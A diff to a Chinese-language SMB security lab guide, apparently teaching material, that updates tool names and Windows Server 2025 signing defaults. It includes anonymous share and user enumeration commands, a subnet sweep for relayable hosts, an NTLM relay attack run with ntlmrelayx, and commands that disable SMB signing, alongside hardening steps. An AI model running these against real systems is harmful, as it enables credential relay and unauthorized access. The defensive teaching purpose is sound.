@@ -206,7 +206,7 @@ Windows XP/2003         Windows 7/2008R2       Windows 10/2016+
 └─────────────────────┘                                      └─────────────────────┘
 ```
 
-> **注意**：本实验中SMB中继攻击需要目标服务器未启用SMB签名（Windows Server 2025工作组模式默认不启用）。所有实验步骤均可在Windows Server 2025上完成。
+> **注意**：Windows Server 2025 的 SMB 签名默认行为与旧版本不同——服务端签名默认不要求，但**客户端签名默认要求**。靶机初始化脚本已关闭客户端签名以满足中继攻击演示需求。所有实验步骤均可在 Windows Server 2025 上完成。
 
 ### 1.2 靶机环境详细配置
 
@@ -281,7 +281,10 @@ Add-WebConfiguration "/system.ftpServer/security/authorization" `
 
 ```powershell
 # --- 5. 确保SMB签名未启用（实验需要） ---
+# Windows Server 2025 默认：服务端签名不要求，但客户端签名要求
+# 实验中继攻击需要同时关闭服务端和客户端签名
 Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
+Set-SmbClientConfiguration -RequireSecuritySignature $false -Force
 
 # --- 6. 开放防火墙端口 ---
 New-NetFirewallRule -DisplayName "SMB-In" -Direction Inbound `
@@ -302,8 +305,8 @@ Write-Host "环境初始化完成！" -ForegroundColor Green
 
 **步骤1：检查SMB共享是否允许匿名访问**
 
-```
-使用smbclient尝试匿名访问
+```bash
+# 使用smbclient尝试匿名访问
 smbclient -L //192.168.1.20 -N
 
 # 预期输出（如允许匿名）：
@@ -314,25 +317,25 @@ smbclient -L //192.168.1.20 -N
 # CompanyShare    Disk
 # IPC$            IPC       Remote IPC
 
-# 使用enum4linux全面枚举
-enum4linux -a 192.168.1.20
+# 使用enum4linux-ng全面枚举（Kali 2025 推荐替代 enum4linux）
+enum4linux-ng -A 192.168.1.20
 
 # 检查是否可以通过空会话枚举用户
-rpcclient -U "" 192.168.1.20 -c "enumdomusers"
-rpcclient -U "" 192.168.1.20 -c "enumdomgroups"
+rpcclient -U "" 192.168.1.20 -N -c "enumdomusers"
+rpcclient -U "" 192.168.1.20 -N -c "enumdomgroups"
 ```
 
 > **知识关联**：对应讲义中”匿名访问控制与枚举防护”——Windows默认允许空会话连接IPC$，可枚举用户和共享。
 
 **步骤2：枚举共享权限和ACL**
 
-```
-使用smbcacls查看共享权限
+```bash
+# 使用smbcacls查看共享权限
 smbcacls //192.168.1.20/CompanyShare -N
 
-# 使用CrackMapExec枚举
-crackmapexec smb 192.168.1.20 --shares
-crackmapexec smb 192.168.1.20 --users
+# 使用NetExec枚举（Kali 2025 中 crackmapexec 已被 netexec/nxc 替代）
+nxc smb 192.168.1.20 --shares
+nxc smb 192.168.1.20 --users
 
 # 尝试访问各个共享
 smbclient //192.168.1.20/CompanyShare -N -c "ls"
@@ -346,7 +349,7 @@ smbclient //192.168.1.20/ADMIN$ -N -c "ls"
 
 **步骤3：识别SMB协议版本**
 
-```
+```bash
 # 使用Nmap识别SMB版本
 nmap -p 445 --script smb-protocols 192.168.1.20
 # 预期输出：
@@ -359,49 +362,42 @@ nmap -p 445 --script smb-protocols 192.168.1.20
 # |     3.0
 # |     3.0.2
 # |     3.1.1
+# 注意：Windows Server 2025 默认不安装 SMBv1，列表中不会出现 NT LM 0.12
 
-# 使用CrackMapExec识别版本
-crackmapexec smb 192.168.1.20
+# 使用NetExec识别版本
+nxc smb 192.168.1.20
 
 # 使用smbclient指定协议版本连接
 smbclient -L //192.168.1.20 -N -m NT1
-# 注意：NT1是SMBv1的方言名称，若SMBv1已禁用则连接会被拒绝
+# 注意：NT1是SMBv1的方言名称，Windows Server 2025 默认未安装 SMBv1，连接会被拒绝
 ```
 
 > **知识关联**：对应讲义中”SMB版本演进”——SMBv1已被废弃但旧系统仍默认启用，存在MS17-010等严重漏洞。
 
 **步骤4：检测SMB签名状态**
 
-```
+```bash
 # SMB签名是防止NTLM中继攻击的关键防御措施
 # 当SMB签名未启用时，攻击者可以将截获的NTLM认证中继到其他服务器
 
-# 使用CrackMapExec检测SMB签名状态
-crackmapexec smb 192.168.1.20
-# 输出中的 Signatures 字段：
-# SMB signing: NOT required  ← 表示签名未强制启用（存在中继风险）
+# 使用NetExec检测SMB签名状态
+nxc smb 192.168.1.20
+# 输出中的 signing 字段：
+# SMB  192.168.1.20  445  TARGET  [*] ... (signing:False)
+# signing:False ← 表示签名未强制启用（存在中继风险）
 
 # 使用Nmap脚本检测SMB安全模式
 nmap -p 445 --script smb-security-mode 192.168.1.20
-# 预期输出：
-# PORT     STATE SERVICE
-# 445/tcp open  microsoft-ds
-# | smb-security-mode:
-# |   account_used: guest
-# |   authentication_level: 1  ← 0=Anonymous, 1=User
-# |   challenge_response: supported
-# |   message_signing: disabled (dangerous, but default)
-# 若已启用签名则显示：
-# |   message_signing: REQUIRED (not dangerous)
 
-# 使用CrackMapExec生成可中继目标列表（扫描网段中签名未启用的主机）
-crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
+# 使用NetExec生成可中继目标列表（扫描网段中签名未启用的主机）
+nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
 # 输出SMB签名未启用的主机IP到relay_targets.txt
 
 # 知识要点：
 # - SMB签名=对每个SMB消息添加数字签名，防止中间人篡改
 # - 签名未启用时，NTLM认证可被透明转发到其他服务器（中继攻击）
-# - Windows默认：域控要求签名，工作组服务器不要求
+# - Windows Server 2025 默认：服务端签名不要求（工作组），客户端签名要求
+#   （靶机初始化脚本已关闭客户端签名以满足实验需求）
 # - 防御措施：RequireSecuritySignature = $true
 ```
 
@@ -438,7 +434,7 @@ echo "192.168.1.20" > /tmp/targets.txt
 
 # 启动SMB中继监听
 # -tf：目标文件  -smb2support：支持SMBv2  -c：中继成功后执行的命令
-sudo ntlmrelayx.py -tf /tmp/targets.txt -smb2support -c "whoami"
+sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support -c "whoami"
 
 # 预期输出（等待连接）：
 # [*] Protocol Client SMB loaded..
@@ -465,22 +461,29 @@ net use \\192.168.1.10\share /user:Jerry P@ssw0rd123
 
 **步骤6：启用SMB签名防御中继攻击**
 
-```
+```powershell
 # 在靶机上启用SMB签名（需要管理员权限）
 # 启用SMB服务端签名（服务器发出的消息带签名）
 Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
+# 启用SMB客户端签名（Windows Server 2025 默认已启用，此处显式确认）
+Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
 
 # 验证签名已启用
 Get-SmbServerConfiguration | Select RequireSecuritySignature
-# 预期：True
+Get-SmbClientConfiguration | Select RequireSecuritySignature
+# 预期：均为 True
+```
 
+从 Kali 重新检测并验证中继攻击失败：
+
+```bash
 # 从Kali重新检测SMB签名状态
-crackmapexec smb 192.168.1.20
+nxc smb 192.168.1.20
 # 输出变化：
-# SMB signing: REQUIRED  ← 签名已强制启用
+# SMB  192.168.1.20  445  TARGET  [*] ... (signing:True)  ← 签名已强制启用
 
-# 再次运行ntlmrelayx中继攻击
-sudo ntlmrelayx.py -tf /tmp/targets.txt -smb2support -c "whoami"
+# 再次运行中继攻击
+sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support -c "whoami"
 
 # 在靶机上再次模拟受害者连接：
 net use \\192.168.1.10\share /user:Jerry P@ssw0rd123
@@ -638,8 +641,14 @@ smb: \Finance\> put /tmp/test.txt
 # 禁用SMBv1（服务端）
 Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
 
-# 禁用SMBv1客户端功能（Windows Server使用Remove-WindowsFeature）
-Remove-WindowsFeature FS-SMB1
+# 确认 SMBv1 功能未安装（Windows Server 2025 默认不安装 SMBv1）
+Get-WindowsFeature FS-SMB1
+# 如果 Install State 显示 Installed，则执行移除：
+# Remove-WindowsFeature FS-SMB1
+
+# 启用SMB服务端和客户端签名（加固核心）
+Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
+Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
 
 # 关闭匿名枚举
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 2 /f
@@ -667,11 +676,11 @@ smbclient -L //192.168.1.20 -N -m NT1
 smbclient -L //192.168.1.20 -N
 # 预期：NT_STATUS_ACCESS_DENIED
 
-enum4linux -a 192.168.1.20
+enum4linux-ng -A 192.168.1.20
 # 预期：大量枚举结果返回空或被拒绝
 
-# CrackMapExec验证
-crackmapexec smb 192.168.1.20 --shares
+# NetExec验证
+nxc smb 192.168.1.20 --shares
 # 预期：无法获取共享列表
 ```
 
@@ -715,8 +724,9 @@ Remove-WebSite -Name "CompanyFTP"
 Remove-Item -Recurse -Force C:\SharedFolder
 Remove-Item -Recurse -Force C:\FTPRoot
 
-# 4. 恢复SMB签名为默认值
+# 4. 恢复SMB签名为默认值（Windows Server 2025 默认：服务端不要求，客户端要求）
 Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
+Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
 
 # 5. 删除防火墙规则
 Remove-NetFirewallRule -DisplayName "SMB-In"
